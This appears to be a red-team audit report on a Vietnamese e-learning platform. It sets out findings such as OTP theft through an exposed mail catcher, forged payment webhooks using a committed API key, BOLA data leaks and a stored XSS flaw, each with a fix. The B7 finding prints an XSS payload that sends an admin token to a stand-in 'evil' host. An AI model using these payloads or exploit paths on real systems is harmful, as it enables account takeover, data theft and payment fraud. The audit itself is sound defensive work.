# Red-Team Final Report — Nhất Nghệ E-Learning Platform
**Scope:** `/home/trung/Desktop/Workspace/elearning-platform` (apps/api NestJS+Prisma, apps/web Next.js, apps/worker) · live `elearning.180.93.47.196.sslip.io` / `api-elearning.180.93.47.196.sslip.io` · branch `videcode-build`
**Date:** 2026-07-13 · findings below are the set that survived adversarial verification.

---

## 1. Verdict — **NO. Not safe for customer UAT, and NOT safe to take real money, as-is.**

This build ships **three independent full-compromise paths that a stranger or the lowest-trust user can walk through today**, plus two more that expose the entire customer PII/revenue book to any self-registered student. Concretely: (a) the transactional mail catcher (Mailpit) is **internet-reachable with zero auth**, and login is email-OTP — so an anonymous attacker can read any user's OTP and log in **as the seeded admin** (`GET /api/v1/messages` returns 200, no `www-authenticate`); (b) the prod compose ships a **git-committed SePay API key and a `*` webhook-IP allowlist**, so anyone can `POST /webhooks/sepay` with a repo-known credential and mark any order paid without paying; (c) any authenticated student can loop `GET /courses/:id/students` to **exfiltrate every customer's name + email** (BOLA), and `GET /courses/:id` to read **per-course gross revenue** and every draft course. On top of that, the known SePay **placeholder receiving account** means real buyers who *do* pay send VNĐ into a dead account and never get enrolled. Any one of these is a sign-off blocker; together they mean the app cannot be shown to a paying customer or connected to real money until the UAT-blocker list below is closed. The core NestJS RBAC guard, service-layer status checks, and server-side sanitization on blog/CMS/email are genuinely solid — this is a **deployment-config + a handful of missed scope-checks** problem, not a rotten foundation, so the blockers are fixable fast.

---

## 2. UAT-BLOCKERS — fix before sign-off / before taking a cent

Ranked by how easily a real attacker/customer hits them.

### B1 — Public, auth-less Mailpit leaks every OTP → anonymous admin account takeover *(Critical)*
- **Evidence:** `docker-compose.dokploy.yml:47-61` (mailpit, `MP_SMTP_AUTH_ACCEPT_ANY=1`, no UI/API auth, comment invites a public traefik domain→8025) + worker `MAIL_TRANSPORT` default `smtp→mailpit` (`:157`). Live: `GET https://mail-elearning.180.93.47.196.sslip.io/readyz`→200, `GET /api/v1/messages`→200 **no auth challenge**. Login OTP is `@Public` (`auth.controller.ts:39-40,54-55`; `otp.service.ts:51-74`; `auth.service.ts:39-72` find-or-creates + issues tokens for any email incl. `admin@nhatnghe.local`).
- **Exploit:** request OTP for any victim → read the 6-digit code from the open Mailpit API → verify → full session, up to and including the 4-tier-Admin account. Rate limits (5/hr, single-use, 15-min TTL) don't help — one code read in seconds suffices. Secondary: real customers never receive OTP/receipts because prod mail is swallowed by the catcher.
- **Fix:** remove the Mailpit traefik domain (never expose 8025); set `MAIL_TRANSPORT=ses` with real creds so prod mail actually delivers. If a mail UI is needed in staging, put it behind basic-auth / IP allowlist. **A catcher must never sit on a public network in an env that receives real OTPs.**

### B2 — Prod compose defaults defeat SePay fail-closed → forge "payment received" with a repo-committed key *(Critical)*
- **Evidence:** `docker-compose.dokploy.yml:~104-105` ships `SEPAY_API_KEY=sandbox-sepay-api-key-placeholder` (33 chars) + `SEPAY_WEBHOOK_IPS=*`; `NODE_ENV=production` (`:69`). `env.ts:74` only length-checks the key (≥16 → placeholder passes); `env.ts:81-88` treats `*` as "configured". `sepay.provider.ts:71` sets `ipUnrestricted=true` for `['*']` → IP allowlist skipped; `:82` expected header = `Apikey <placeholder>`. `sepay-webhook.controller.ts:23-31` `@Public POST /webhooks/sepay`; `sepay-webhook.service.ts:47-102` matches order by buyer-visible `business_code`, amount = public course price → enqueues confirm → order paid + enrolled.
- **Exploit:** `POST /webhooks/sepay` from any IP with `Authorization: Apikey sandbox-sepay-api-key-placeholder` (value is in the repo) and the target's visible order code → free enrollment in any paid course, corrupted revenue/reconciliation. Idempotency/amount guards block replay/wrong-amount, not a first correct forge.
- **Fix:** `env.ts` superRefine must **blocklist known placeholders** (not just length), treat `SEPAY_WEBHOOK_IPS='*'` as NOT-configured in production, and **remove the secret-ish defaults from compose** so a missing Dokploy env fails boot instead of silently using the committed key.

### B3 — Any student enumerates every course's full roster (name + email PII) — BOLA on `GET /courses/:id/students` *(Critical)*
- **Evidence:** `courses.controller.ts:69-73` gates only `@RequireGrant('course','R')`. `accessLevelOrder` (`packages/shared-types/src/index.ts:213-220`) reads only the leading letter, discarding the `(enr/pub)`/`(own)` suffix, so STU `course:'R(enr/pub)'` (`seed.ts:135`) satisfies R. `permissions.guard.ts:101-106` does no row scoping. `courses.service.ts:180` `listStudents(id,query)` takes **no caller identity**, scopes WHERE only to the URL `course_id`, returns `user.name + user.email` for every enrollment. Orders/certs do this correctly via `callerReadsAnyOrder`/`callerReadsAnyInArea`; courses omits it.
- **Exploit:** self-register → `GET /courses` (also unscoped) to enumerate ids → loop `GET /courses/{id}/students?pageSize=…` → harvest name+email of the entire customer base. No instructor/admin privilege, no UI needed.
- **Fix:** thread `req.user.sub`+`req.currentRole` into `CoursesService.list/get/listStudents`; if `!callerReadsAnyInArea(prisma, role, 'course')` constrain to courses the caller owns (GV `instructor_id===caller`) or is enrolled in (STU) — mirror `orders.service.ts`.

### B4 — Per-course revenue + full draft/unpublished catalog disclosed to any student/instructor *(High)*
- **Evidence:** `courses.controller.ts:48-52` (list) / `60-64` (get) require only `course:R`. `courses.service.ts:147-169` `get()` returns `revenue = SUM(paid order_items)`; `:102` `list()` filters only `deleted_at`, returning **all statuses** incl. drafts with instructor/price/enrollment counts (`COURSE_SELECT :29-54`). Same suffix-strip as B3; reachable by any OTP/Google self-signup STU.
- **Exploit:** `GET /courses/{id}` → gross revenue of any course; `GET /courses` → every unpublished course + instructor roster pre-launch. GV sees revenue/drafts of courses they don't teach.
- **Fix:** same root fix as B3 — scope list/get by caller ownership/enrollment; **strip the `revenue` field and non-published rows** for callers lacking unscoped `callerReadsAnyInArea('course')`.

### B5 — Guard silently drops grant scope suffixes → SAL (`payments:W(own)`) can refund/force-confirm ANY order *(High)*
- **Evidence:** `accessLevelOrder` collapses `W(own)`→`W`; `permissions.guard.ts:101-106` compares only the letter. SAL holds `payments:'W(own)'` (`seed.ts:127`). `orders.controller.ts:115-129` gates `manual-confirm` and `refund` on only `@RequireGrant('payments','W')` — no `@RequireRole`, no owner predicate. `refundOrder` (`orders.service.ts:235`) and `manualConfirm` (`:278`) load the order by id and mutate it; `actorUserId` is audit-only.
- **Exploit:** a Sales user can **refund or force-confirm any order system-wide** — comp free courses to arbitrary buyers, or issue rogue refunds. (Verifier refuted the finding's broader "every own-scoped area leaks" claim — crm/leads/classes have no controllers yet — but this payments write-BOLA is concretely reachable by a default-seeded role.)
- **Fix:** enforce actor==owner in `manualConfirm`/`refundOrder` for own-scoped grants; make scope structural — parse the qualifier in the guard, stamp `req.grantScope`, and require an owner predicate. Add a test asserting SAL cannot confirm/refund another user's order.

### B6 — Global search leaks the entire order book (buyer names + codes + payment status) to any student *(High)*
- **Evidence:** `search.service.ts:30-31,38` gates the ORDER group on `accessLevelOrder(grants.payments)>=R`; suffix-strip makes STU `payments:'R(own)'` pass. `searchOrders` (`:101-114`) has **no owner scope** (WHERE = `deleted_at:null` + OR on `business_code`/`user.name`/`user.email`), selects `business_code, status, user.name` across all orders. Every other surface excludes own-scoped grants via `!/own/i.test(g)` (`area-read-scope.ts`, `orders.service.ts:481`); search forgot.
- **Exploit:** `GET /search?q=nguyen` (or `a`, `@gmail`, a course name) returns every matching order across all customers; iterating substrings dumps the whole revenue/PII book. Secondary: `searchCourses` has no published/enrollment filter (course over-read).
- **Fix:** replace the naive `>=R` gate with `callerReadsAnyInArea`/the `!/own/i.test(grant)` rule so own/team-scoped grants don't open orders/users groups; or own-scope `searchOrders` to `user_id=caller`. Regression test: STU search returns zero order rows.

### B7 — Stored XSS in homepage/page section builder → `website:W` staffer takes over admin session *(High)*
- **Evidence:** `website.dto.ts:31` `sectionContentSchema = z.record(z.string(), z.unknown())` (unsanitized). `homepage-sections.service.ts:133` saveDraft stores raw; `:227-237` publish copies raw — **no sanitizer** (blog/lessons/custom-pages/email all DO sanitize; this is the lone gap). Sink: `homepage-inline-edit.tsx:91` (public SSR) **and `:101` (admin edit canvas)** render `value` via `dangerouslySetInnerHTML`. `readSectionText` (`homepage-funnel-content.ts:144-150`) returns the stored string verbatim into ~15 section fields. Write gated only by `@RequireGrant('website','W')` (`homepage-sections.controller.ts:30`). Token is JS-readable in `sessionStorage.nn_access_token`; **no CSP** (`next.config.js` sets no security headers; live `curl -sI` → 200, no `Content-Security-Policy`, no `X-Frame-Options`).
- **Exploit:** a `website:W` (marketing) or phished W account saves a draft title = `<img src=x onerror="fetch('//evil/?t='+sessionStorage.nn_access_token)">`. **A single saveDraft (no publish needed)** — when any ADM opens `/admin/website` to review, the payload runs in their session (`:101`), exfiltrates the admin bearer, and escalates W→Admin. Also renders on the public homepage for every visitor.
- **Fix:** sanitize section string fields server-side in `saveDraft` **and** `publishDraft` (reuse `sanitizeBlogContent` / a narrow funnel allowlist), re-sanitize on read to clean existing rows. Add a strict CSP on the SPA origin. Do not rely on the "trusted admin" assumption at `homepage-inline-edit.tsx:73` — W ≠ Admin.

### B8 — SePay receiving account is a placeholder → real buyers pay VNĐ into a dead account, paid courses never auto-confirm *(High)*
- **Evidence:** `env.ts:81-88` presence-checks only (`!cfg[key]`), so placeholder `'0000000000'` (default `env.ts:117`) is truthy and boots green. `sepay.provider.ts:44-58` bakes it into the VietQR; `checkout-qr-panel.tsx:40` renders it to the buyer; webhook confirm (`:80-85`) needs an Apikey callback that never arrives for a dead account. The validity-check fix exists **only on unmerged branch `p11-sepay`** — the deployed `videcode-build` has the presence-only guard.
- **Exploit:** buyer scans the checkout QR, transfers to `0000000000@Vietcombank` → money lost, order stuck `pending` until timeout. **Paid courses are unsellable AND buyers lose money.**
- **Fix:** `env.ts` superRefine must validate account length/checksum + placeholder denylist and require the real `SEPAY_QR_BASE_URL`; gate paid checkout behind a boot-time SePay self-test. **Until fixed, disable paid checkout in prod.**

---

## 3. Remaining risks by severity (deduped)

### High (deploy hardening — latent, not a sign-off gate but fix soon)
- **Postgres 5432 + password-less Redis 6379 published to `0.0.0.0`** — `docker-compose.dokploy.yml:23,36` (+ `docker-compose.yml:12,25`). Redis has **no `requirepass` anywhere**; Postgres defaults to `changeme-local-only` if unset. App reaches both over the internal docker network, so the host publish is pure surface. Host firewall filters the ports today (not externally exploitable now), but any firewall lapse / shared-tenant neighbor gets auth-less Redis (BullMQ job injection, cache flush) and default-password Postgres (users/orders/entitlements). **Fix:** drop the `ports:` publish (or bind `127.0.0.1`), set a strong Redis `requirepass` + non-default `POSTGRES_PASSWORD`.

### Medium
- **Access JWT in `sessionStorage` is XSS-exfiltratable and unrevocable** — `auth-client.ts:14-21` (`nn_access_token`), impersonation token shares it (`impersonation-client.ts:59,88`). `verifyToken` is pure signature+exp (`auth.service.ts:102-108`); logout-all only revokes refresh tokens. CMS/blog/email write paths are server-sanitized (mitigates the *easy* vector), **but no CSP** means any sanitizer-bypass/dependency XSS (see B7) exfiltrates a 15-min bearer with **no kill switch**. **Fix:** in-memory access token + access-token revocation (token-version / `tokens_valid_after`) + CSP.
- **`@SelfScope` routes never re-check `status`/`deleted_at`** — `permissions.guard.ts:69-76` selects only `{role}`. A banned/soft-deleted user keeps self-service (create orders, open tickets, download data) for the ≤15-min token TTL, contradicting the "takes effect next request" guarantee the RequireGrant branch enforces (`:82-85`). `me.service` compensates; orders/helpdesk/notifications/certs don't. **Fix:** fetch `{role,status,deleted_at}` in the SelfScope branch and reject non-active/deleted.
- **Any custom role with `course:'R'` bypasses the enrollment paywall** — `lesson-playback-entitlement.ts:99-104`: bare `R` (no `enr`/`pub` suffix) is treated as blanket back-office read and **skips the enrollment check**. The roles editor can only write bare levels (`roles.dto.ts:5-10`), so an admin granting a new role course-Read silently opens **every paid course's HLS**. **Worse than reported:** the seeded **COO role already ships bare `course:'R'`** (`seed.ts:96`) → a shipped non-student role already streams all paid video. **Fix:** treat bare `R`/`R(own)` as enrollment-scoped (require live enrollment); only bypass for `A`/explicit blanket marker.
- **`payments:W` insider self-confirms free courses** — `manual-confirm` (`orders.controller.ts:115-118`) requires only `payments:W`; `manualConfirm` (`orders.service.ts:278-310`) enrolls with **no money-received check, no actor≠buyer check**. Reachable by default-seeded SAL. (Overlaps B5.) **Fix:** require `payments:D`/`A` or a distinct grant, forbid self-confirm, require a bank reference on the row.
- **Certificate completion is forgeable** — `learning.dto.ts:17` accepts `completed:true` with no `watchedPct`; `progress-rules.ts:26` `resolveCompleted` returns true for `manual` unconditionally (`MANUAL_COMPLETE_MIN_PCT=60` is dead server-side); `learning.service.ts:200-211` auto-mints a QR-verifiable cert at 100%. Any enrolled student scripts `PATCH …/progress {completed:true}` per lesson → cert for an unwatched course. (Self-forgery of one's own cert, not cross-user — but hollows out the platform's trust product.) **Fix:** enforce `watchedPct >= MIN_PCT` server-side for manual completes.
- **Soft-deleted course keeps streaming + still on dashboard, but its learn link 404s** — `courses.service.ts:399-421` soft-deletes only the course row (no cascade, no enrollment revoke); `assertEntitled` (`lesson-playback-entitlement.ts:88-113`) never checks `course.deleted_at` → playback + attachment endpoints keep serving; `listEnrollments` (`learning.service.ts:89-98`) still shows the card, but `getOutline` (`:235-257`) filters `deleted_at:null` → 404. Admin's revoke intent silently defeated + the broken-link class the human already caught. **Fix:** revoke enrollments in the delete txn, or add `course.deleted_at IS NULL` to `assertEntitled` + exclude deleted courses from `listEnrollments`.
- **Free-course double-submit creates duplicate active enrollments** — `enrollments` has **no `@@unique(user_id,course_id)`** (`schema.prisma:418-421`); `confirm-order-and-enrol.ts:78` locks only the order row; guard at `:124-146` is a non-atomic `findFirst→create` under READ COMMITTED; free path (`orders.service.ts:82-93`) mints a fresh order every call. Two concurrent `POST /orders` → two active rows, doubled `order.paid`/`enrollment.created` fan-out (dedup keyed on distinct orderId). Cert double-issue is blocked by the certs unique index; automation partly deduped by `flow_enrollments` partial unique. Free-course only, data-integrity (skewed counts), no money loss. **Fix:** partial `@@unique(user_id,course_id) WHERE deleted_at IS NULL` + upsert; reuse pending free order.
- **Client API base silently falls back to unreachable `<web-host>:4000`** — `api-config.ts:9-13` returns `${hostname}:4000` when `NEXT_PUBLIC_API_URL` unset; the header comment is **stale** (Dockerfile `:13-14` now passes the ARG). Not broken today (correct subdomain baked in), but any future redeploy omitting the ARG breaks **100% of browser flows** (login/OTP/checkout/enroll/cert/Google OAuth) while build+deploy go green — the team's own `redeploy≠deploy` trap. **Fix:** route through a same-origin Next rewrite, or make `getApiBaseUrl()` fail-loud in production; delete the stale comment.

### Low
- **Bearer guard bakes role into the 15-min JWT; no access-token deny-list** (`jwt-auth.guard.ts`, `token.service.ts:151-163`). Largely mitigated: `PermissionsGuard`/`ImpersonationGuard` re-read current role+status fresh from Postgres every request, so role-demotion and locked-account exploits close on the next request for guarded routes. Residual = the `@SelfScope` gap above + no kill switch for a stolen token. **Fix:** access-token revocation (`tokens_valid_after`).
- **Entitlement gate is a REVOKED denylist, not an ACTIVE allowlist** (`lesson-playback-entitlement.ts:24-25,106`; `learning.service.ts:24,290`). Not exploitable today (only `active`/`refunded` are ever written), but any future non-active/non-revoked status (`trial`, `pending`, import typo) grants free playback. **Fix:** require `status==='active'` (+`'completed'` if applicable).
- **Progress can exceed real completion when a completed lesson is later deleted** — `countCompleted` (`learning.service.ts:307-311`) doesn't filter `lesson.deleted_at`; `countCourseLessons` does → inflated %, can wrongly auto-issue a cert. **Fix:** filter `countCompleted` by `lesson:{deleted_at:null}`.
- **Renewed enrollment loses its pre-expiry warning** — `confirm-order-and-enrol.ts:131-134` doesn't reset `expiry_reminded_at`; scan skips already-reminded rows → renewed window silently expires unwarned. **Fix:** set `expiry_reminded_at:null` on reactivation.
- **`issueCertificate` can permanently dead-letter** if a cert row is ever soft-deleted (idempotency reads `deleted_at:null`, unique index doesn't). Latent — no revoke route today, but Phase-2 revoke is referenced. **Fix:** match idempotency read to the constraint (drop `deleted_at:null` or partial index).
- **Phone validator inconsistent** — strict `/^0\d{9}$/` on self-service (`me.dto.ts:11,25-30`), unvalidated `max(30)` on admin create/edit (`users.dto.ts:31,38`). Cosmetic data-integrity only (no OTP/SMS consumer; phone only hits invoice PDF). **Fix:** centralize one shared validator like `SLUG_RE`.
- **Footer "chat" social icon is a dead affordance** — `public-shell.tsx:129` (`icon:'message'`, no `href`/`bind`) renders as inert `<span>` beside real FB/YT links; looks like live chat, does nothing. The dead-control class humans keep catching. **Fix:** wire to a real Zalo/support channel via a `social.chat_url` config key, or remove it.
- **Deploy verify-at-source broken** — prod `/health` reports `commitSha:"local-dev"` (`docker-compose.dokploy.yml:73,143` never inject `COMMIT_SHA`). Defeats the org's build-provenance/stale-container standard; signals an unversioned build in "prod". **Fix:** inject git SHA at deploy, assert `/health.commitSha == released sha`.
- **`CORS_ORIGIN` prod default is `localhost`; web leaks `x-powered-by: Next.js`** — `http-security.ts:30`, `next.config.js` (no `poweredByHeader:false`). CORS is correctly restrictive today (evil origin not reflected); risk is a self-inflicted outage if the env is ever unset + a minor fingerprint leak. **Fix:** require `CORS_ORIGIN` in production (fail boot if unset); set `poweredByHeader:false`.

---

## 4. Prioritized FIX BACKLOG

### 🔴 BEFORE UAT / before taking money (all UAT-blockers)
- [ ] **B1** Remove Mailpit public traefik domain; switch prod `MAIL_TRANSPORT=ses` with real creds (mail must actually deliver, not to a catcher)
- [ ] **B2** `env.ts`: placeholder-denylist the SePay key + treat `SEPAY_WEBHOOK_IPS='*'` as unconfigured in prod; delete secret-ish defaults from `docker-compose.dokploy.yml`
- [ ] **B8** `env.ts`: validate SePay account (length/checksum + placeholder denylist) + boot-time self-test; **disable paid checkout until a real account is configured**
- [ ] **B3** Scope `CoursesService.listStudents` (+ `list`) by caller ownership/enrollment — kill the roster PII BOLA
- [ ] **B4** Strip `revenue` field + non-published rows from `courses` responses for non-unscoped callers
- [ ] **B5** Enforce actor==owner in `manualConfirm`/`refundOrder`; make grant scope structural in `PermissionsGuard`
- [ ] **B6** `search.service.ts`: use `callerReadsAnyInArea` / own-scope filter for orders + users + courses groups
- [ ] **B7** Server-sanitize homepage/page section content on write **and** publish + re-sanitize on read; add a CSP on the SPA origin
- [ ] Regression tests: STU roster→403/empty, STU search→0 orders, `POST /webhooks/sepay` with placeholder key→reject, section-XSS payload stripped, SAL cannot confirm/refund another user's order

### 🟠 SOON (High/Medium hardening)
- [ ] Drop `ports:` publish for Postgres+Redis (or bind `127.0.0.1`); set Redis `requirepass` + non-default `POSTGRES_PASSWORD`
- [ ] Access token in-memory + access-token revocation (`tokens_valid_after`) + logout-all kill switch
- [ ] `@SelfScope` branch: re-check `status`/`deleted_at`
- [ ] Entitlement gate: bare `course:'R'` must require live enrollment (close COO + custom-role paywall bypass)
- [ ] `manual-confirm` → require `payments:D`/`A` + bank-reference, forbid self-confirm
- [ ] Server-enforce `watchedPct` on manual lesson complete (cert integrity)
- [ ] Reconcile soft-deleted-course lifecycle (revoke enrollments in delete txn or guard `assertEntitled` + `listEnrollments`)
- [ ] Partial `@@unique(user_id,course_id)` on enrollments + upsert
- [ ] Same-origin API rewrite or fail-loud `getApiBaseUrl()`; delete stale comments

### 🟡 LATER (Low / defense-in-depth)
- [ ] Flip entitlement gates to `status==='active'` allowlist
- [ ] `countCompleted` filter `lesson:{deleted_at:null}`
- [ ] Reset `expiry_reminded_at` on enrollment reactivation
- [ ] Certificate idempotency read = unique-index shape (pre-empt Phase-2 revoke dead-letter)
- [ ] Centralize phone validator across `me.dto`/`users.dto`
- [ ] Wire or remove the footer chat icon
- [ ] Inject `COMMIT_SHA` at deploy + assert on `/health`
- [ ] Require `CORS_ORIGIN` in prod; `poweredByHeader:false`

---

## 5. Cross-check vs the known-open list

| Known-open item | Verdict | Notes / worse variant found |
|---|---|---|
| **SePay account placeholder in prod** | ✅ **CONFIRMED** (B8, High) | Presence-only guard boots green; buyers lose money, orders never confirm. Fix exists only on unmerged `p11-sepay`. **NEW WORSE variant (B2, Critical):** the compose also ships a **git-committed API key + `*` IP allowlist** → an attacker doesn't need the real account at all; they forge the webhook and mark orders paid. This is strictly worse than "money to a fake account." |
| **Hardcoded 'Nhất Nghệ' in email/PDF/JSON-LD** | ⚠️ **Confirmed present, not separately re-scored** | Cosmetic/branding, matches prior tracking. No security impact found beyond it. Note the seeded admin is `admin@nhatnghe.local` — relevant to B1's takeover target. |
| **DB/Redis ports host-exposed** | ✅ **CONFIRMED** (High, latent) | `5432`/`6379` published to `0.0.0.0`; **Redis has no password at all**, Postgres default is `changeme-local-only`. Host firewall masks it today → not externally exploitable now, but one lapse away. |
| **SES DKIM/SPF pending** | ✅ **CONFIRMED — and it is the root enabler of B1** | Because SES isn't wired, prod mail falls to the Mailpit catcher (`MAIL_TRANSPORT=smtp` default). Combined with the public Mailpit UI, "pending SES" escalates from a deliverability nuisance to **anonymous admin takeover**. Fix SES + close Mailpit together. |
| **HLS AES-128 backlog** | ⚠️ **Confirmed backlog; NOT the live paywall hole** | Encryption is deferred, but the **actually reachable** paywall bypass is the entitlement gate treating bare `course:'R'` as blanket read (**seeded COO already streams all paid video**) + soft-deleted courses still streaming — code-level authz gaps, not the missing AES. Prioritize those over AES-128. |

**Additional NEW worse-than-tracked items surfaced:** (a) **anonymous** admin takeover via Mailpit+OTP (B1) — worse than any tracked auth item; (b) **Critical** unauthenticated payment *forge* via committed key (B2) — worse than the tracked "money to fake account"; (c) two **Critical/High customer-PII + revenue BOLA** paths (B3/B4/B6) reachable by the lowest-trust role; (d) **stored XSS → admin escalation** by a `website:W` staffer (B7).

---

## 6. Residual / unresolved questions

1. **Is the prod Dokploy env actually overriding the compose defaults?** All three deploy Criticals (B1 IP/mail, B2 SePay key, B8 account) hinge on whether operators set real values in the Dokploy panel vs. inheriting compose defaults. The live Mailpit probe proves B1 is live; the known-open context implies B2/B8 defaults are in effect — but the Dokploy env is not readable from the repo. **Needs an ops confirm of the live env vars.** (Do not mutate anything to test B2 against live.)
2. **Was `p11-sepay` (the SePay validity-check fix) meant to be in this UAT build?** It's unmerged into `videcode-build`. Confirm whether the release was cut before that branch landed.
3. **Firewall durability for the DB/Redis ports** — the ports are filtered today; is that an intentional host firewall rule that will survive Dokploy network/redeploy changes, or incidental? Determines whether the High is truly latent.
4. **Impersonation-operator token** shares the `sessionStorage` weakness (`impersonation-client.ts:59,88`) — the impersonation flows weren't deeply exercised for their own BOLA surface; worth a dedicated pass since impersonation grants elevated identity.
5. **CMS/custom-pages/blog sanitizer allowlists** were confirmed present but not fuzzed for bypass — given there's **no CSP backstop**, a single sanitizer-bypass anywhere becomes token theft. A focused sanitizer-bypass review is warranted before relying on them as the only defense.